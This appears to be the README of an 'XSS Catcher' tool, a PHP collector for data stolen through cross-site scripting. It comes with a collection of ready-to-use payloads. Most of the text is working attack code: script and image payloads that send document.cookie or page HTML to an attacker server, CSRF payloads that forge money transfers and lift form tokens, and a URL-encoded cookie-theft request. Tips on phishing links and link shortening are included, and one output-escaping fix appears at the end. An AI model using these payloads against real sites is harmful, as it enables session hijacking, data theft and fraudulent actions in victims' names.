# XSS Catcher

PHP API for storing all incoming XSS requests. Also including various XSS templates.

Incoming XSS request can have `data` (i.e., stolen data), `site`, `redirect`, and `info` HTTP request parameters.

Use `<script src="https://myserver.com?redirect=xss.js"></script>` payload to both, store the incoming XSS request and execute additional JavaScript code specified in `xss.js` - where `xss.js` is equal to the relative path `./xss.js`.

Play with the given payloads and create your own, possibly shorter.

Tested on XAMPP for Windows v7.4.3 (64-bit) with Chrome v92.0.4515.131 (64-bit) and Firefox v90.0.2 (64-bit).

Made for educational purposes. I hope it will help!

Future plans:

* MQTT template.

## Table of Contents

* [How to Run](#how-to-run)
* [Cross-Site Scripting (XSS)](#cross-site-scripting-xss)
	* [XSS Types](#xss-types)
	* [XSS Injections](#xss-injections)
* [Cross-Site Request Forgery (CSRF)](#cross-site-request-forgery-csrf)
	* [CSRF Injections](#csrf-injections)
	* [CSRF Templates](#csrf-templates)
* [Proof of Concept (XSS) - No Input Sanitization](#proof-of-concept-xss---no-input-sanitization)
* [Images](#images)

## How to Run

Import [\\db\\xss_catcher.sql](https://github.com/ivan-sincek/xss-catcher/blob/master/db/xss_catcher.sql) to your database server.

Copy all the content from [\\src\\](https://github.com/ivan-sincek/xss-catcher/tree/master/src) to your server's web root directory (e.g., to \\xampp\\htdocs\\ on XAMPP).

Change the database settings inside [\\src\\php\\config.ini](https://github.com/ivan-sincek/xss-catcher/blob/master/src/php/config.ini) as necessary.

Navigate to your database panel with your preferred web browser.

You can use [ngrok](https://ngrok.com) to give your web server a public address.

---

If callback HTTP requests are being blocked, try setting the following cross-origin resource sharing \([CORS](https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS)\) policy in your web server's configuration file; e.g., on XAMPP, edit `\conf\httpd.conf` from your Apache directory:

```fundamental
<IfModule mod_headers.c>
	Header always set Access-Control-Allow-Methods "GET, POST, OPTIONS"
	Header always set Access-Control-Allow-Headers "Content-Type"
	Header always set Access-Control-Allow-Origin "*"
	# Header always set Access-Control-Allow-Credentials "true"
</IfModule>
```

However, using the above policy, your web server will not be receiving any HTTP cookies in the `Cookie` HTTP request header; but, you can still send them in the `data` HTTP request parameter.

The above policy is already set in [\\src\\.htaccess](https://github.com/ivan-sincek/xss-catcher/blob/master/src/.htaccess), but depending on your web server's current configuration, it might be ignored or overriden.

If you want cookies to be sent in the `Cookie` HTTP request header, keep in mind that the following CORS parameters CANNOT go together:

```fundamental
Access-Control-Allow-Origin: *
Access-Control-Allow-Credentials: true
```

Instead, you will need to specify your target's domain:

```fundamental
Access-Control-Allow-Origin: https://target.com
Access-Control-Allow-Credentials: true
```

## Cross-Site Scripting (XSS)

Usually used to steal HTTP cookies or to modify a web page.

### XSS Types

The most common type is the reflected XSS attack. It usually reflects malicious code only to the person who, e.g,. opens a malicious link.

Stored XSS attack is when malicious code gets stored (i.e., saved) into, e.g., a database table, file, etc. It usually reflects to every person who loads the infected table, file, etc.

DOM based XSS attack reflects malicious code only to the person who, e.g., opens a malicious link; but, comapred to the reflected XSS attack, it cannot modify the HTTP response but only already loaded HTML content.

### XSS Injections

Simple cross-site-scripting (XSS) payloads:

```xhtml
<script>alert(1)</script>

<script src="https://myserver.com?redirect=xss.js"></script>

<img src="https://github.com/favicon.ico" onload="alert(1)">

<img src="xxx" onerror="alert(1)">
```

**To dump the HTML content of a hidden/inaccessible web page, simply replace `document.cookie` with `document.body.innerHTML` in the below payloads.**

---

**HTTP cookies must be missing the HttpOnly flag in order for you to steal them. SameSite flag might also prevent you from stealing them.**

Steal HTTP cookies by injecting the following JavaScript code:

```xhtml
<script>var xhr = new XMLHttpRequest(); xhr.open('POST', 'https://myserver.com', true); xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded'); xhr.send('site=' + encodeURIComponent(location.hostname + location.pathname) + '&data=' + encodeURIComponent(document.cookie));</script>

<script>var xhr = new XMLHttpRequest(); xhr.open('POST', 'https://myserver.com', true); xhr.send('{\"site\": \"' + encodeURIComponent(location.hostname + location.pathname) + '\", \"data\": \"' + encodeURIComponent(document.cookie) + "\"}");</script>
```

First payload above will send an HTTP POST request to your server with user-defined parameters as a form-data. Opt for this payload whenever possible.

To send user-defined parameters as a form-data, you must add `Content-Type: application/x-www-form-urlencoded` HTTP request header.

Second payload above will send an HTTP POST request to your server with raw data encoded in JSON.

---

Steal HTTP cookies by injecting the following HTML code:

```xhtml
<img src="https://github.com/favicon.ico" onload="var xhr = new XMLHttpRequest(); xhr.open('POST', 'https://myserver.com', true); xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded'); xhr.send('site=' + encodeURIComponent(location.hostname + location.pathname) + '&data=' + encodeURIComponent(document.cookie));" hidden="hidden">

<img src="https://github.com/favicon.ico" onload="this.src = 'https://myserver.com?site=' + encodeURIComponent(location.hostname) + location.pathname + '&data=' + encodeURIComponent(document.cookie);" hidden="hidden">
```

First payload above will send an HTTP POST request to your server with user-defined parameters as a form-data.

Second payload above will send an HTTP GET request to your server with user-defined parameters in a query string (i.e., in a URL).

## Cross-Site Request Forgery (CSRF)

Not necessarily used to steal HTTP cookies or to modify a web page. The goal is to just execute a forged query in the name/session/context of an already signed-in user.

The simplest way to do so, is to send a phishing email containing a link such as `https://target.com/transfer.php?recipient=eve&amount=9000` (limited to HTTP GET request) to the victim or to store/hide a malicious code in either your target's website or your own website, and then send the less suspicious link.

**Try to figure out what kind of data does a backend server accept before you try to forge/send anything. Is it a query string, form-data, raw data encoded in JSON, etc.?**

---

JavaScript:

* can execute multiple HTTP requests in a row,
* can extract data from one HTTP response and use it in another HTTP request,
* usually gets blocked by [CORS](https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS).

HTML:

* can execute multiple HTTP requests in a row (limited to HTTP GET request, race condition may occur),
* ~~can extract data from one HTTP response and use it in another HTTP request,~~
* ~~usually gets blocked by [CORS](https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS#simple_requests).~~

CSS:

* can execute multiple HTTP requests in a row (limited to HTTP GET request, race condition may occur),
* ~~can extract data from one HTTP response and use it in another HTTP request,~~
* ~~usually gets blocked by [CORS](https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS#simple_requests).~~

### CSRF Injections

Plant a forged request by injecting the following JavaScript code:

```xhtml
<script>var xhr = new XMLHttpRequest(); xhr.open('POST', 'https://target.com/transfer.php', true); xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded'); xhr.send('recipient=eve&amount=9000');</script>
```

Payload above will send an HTTP POST request to a target server in the victim's name with user-defined parameters as a form-data.

---

Plant a forged request whilst stealing a web form token by injecting the following JavaScript code:

```xhtml
<script>window.onload = function() { var xhr = new XMLHttpRequest(); xhr.open('POST', 'https://target.com/transfer.php', true); xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded'); xhr.send('recipient=eve&amount=9000&token=' + encodeURIComponent(document.getElementsByName('token')[0].value)); }</script>

<script>window.onload = function() { var xhr = new XMLHttpRequest(); xhr.open('GET', 'https://target.com/transfer.php?recipient=eve&amount=9000&token=' + encodeURIComponent(document.getElementsByName('token')[0].value), true); xhr.send(); }</script>
```

First payload above will send an HTTP POST request to a target server in the victim's name with user-defined parameters as a form-data.

Second payload above will send an HTTP GET request to a target server in the victim's name with user-defined parameters in a query string (i.e., in a URL).

**To steal a web form token or any other web form data, you must wait for the web form to fully render/load. You can do that by calling the `window.onload` event.**

---

Plant a forged request by injecting the following HTML code:

```xhtml
<img src="https://target.com/transfer.php?recipient=eve&amount=9000" alt="csrf" hidden="hidden">

<img src="https://github.com/favicon.ico" alt="csrf" style="background-image: url('https://target.com/transfer.php?recipient=eve&amount=9000');" hidden="hidden">
```

Both payloads above will send an HTTP GET request to a target server in the victim's name with user-defined parameters in a query string (i.e., in a URL).

---

Plant a forged request by injecting the following CSS code:

```xhtml
<style>div { background-image: url('https://target.com/transfer.php?recipient=eve&amount=9000'); }</style>
```

Payload above will send an HTTP GET request to a target server in the victim's name with user-defined parameters in a query string (i.e., in a URL).

### CSRF Templates

Copy all the content from [\\templates\\](https://github.com/ivan-sincek/xss-catcher/tree/master/templates) to your server's web root directory (e.g., to \\xampp\\htdocs\\ on XAMPP).

You can also use this simple Python3 one-liner to start a local web server from a specified directory:

```fundamental
python3 -m http.server 9000 --directory somedir
```

Change the URL, HTTP method, HTTP request headers, data, etc. inside the scripts as necessary. Extend the scripts to your liking.

Navigate to the templates with your preferred web browser.

You can use [ngrok](https://ngrok.com) to give your web server a public address.

## Proof of Concept (XSS) - No Input Sanitization

This proof of concept shows how to steal HTTP cookies through an unsanitized HTTP request parameter.

Vulnerable code:

```xhtml
<script>var language = '<?php if (isset($_GET["language"])) { echo $_GET["language"]; } ?>';</script>
```

Expected use:

```xhtml
<script>var language = 'en';</script>
```

User-supplied data:

```fundamental
en'; var xhr = new XMLHttpRequest(); xhr.open('POST', 'https://myserver.com', true); xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded'); xhr.send('site=' + encodeURIComponent(location.hostname + location.pathname) + '&data=' + encodeURIComponent(document.cookie)); var test = '
```

**Always make sure to properly close the surrounding code.**

Encode your code to the URL encoded format [here](https://www.urlencoder.org).

Final XSS request:

```fundamental
https://localhost/welcome.php?language=en%27%3B%20var%20xhr%20%3D%20new%20XMLHttpRequest%28%29%3B%20xhr.open%28%27POST%27%2C%20%27https%3A%2F%2Fmyserver.com%27%2C%20true%29%3B%20xhr.setRequestHeader%28%27Content-Type%27%2C%20%27application%2Fx-www-form-urlencoded%27%29%3B%20xhr.send%28%27site%3D%27%20%2B%20encodeURIComponent%28location.hostname%20%2B%20location.pathname%29%20%2B%20%27%26data%3D%27%20%2B%20encodeURIComponent%28document.cookie%29%29%3B%20var%20test%20%3D%20%27
```

\[OPTIONAL\] Shorten your query string (i.e., URL) with [Bitly](https://bitly.com).

Solution (output escaping):

```xhtml
<script>var language = '<?php if (isset($_GET["language"])) { echo htmlentities($_GET["language"], ENT_QUOTES, "UTF-8"); } ?>';</script>
```

## Images

<p align="center"><img src="https://github.com/ivan-sincek/xss-catcher/blob/master/img/db.jpg" alt="Database"></p>

<p align="center">Figure 1 - Database</p>
